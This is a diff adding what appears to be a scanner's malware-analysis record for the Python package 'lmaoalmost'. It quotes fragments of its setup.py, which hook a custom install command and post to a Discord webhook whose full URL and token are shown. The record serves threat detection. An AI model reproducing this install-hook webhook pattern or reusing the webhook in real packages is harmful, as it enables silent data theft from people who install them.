@@ -1,0 +1,35 @@
+{
+  "package_metadata": {
+    "name": "lmaoalmost",
+    "version": "0.69",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [
+      "https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB"
+    ],
+    "process_spawns": []
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "setup(\n  name = 'lmaoalmost',\n  packages=find_packages(),\n  version = '0.69',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author...\n  )\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "          webhook = Webhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB', adapter=AsyncWebhookAdapter(session))\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.75,
+    "risk_score": 0.75,
+    "confidence": 0.9,
+    "cwe_ids": [
+      "CWE-502",
+      "CWE-94"
+    ]
+  }
+}
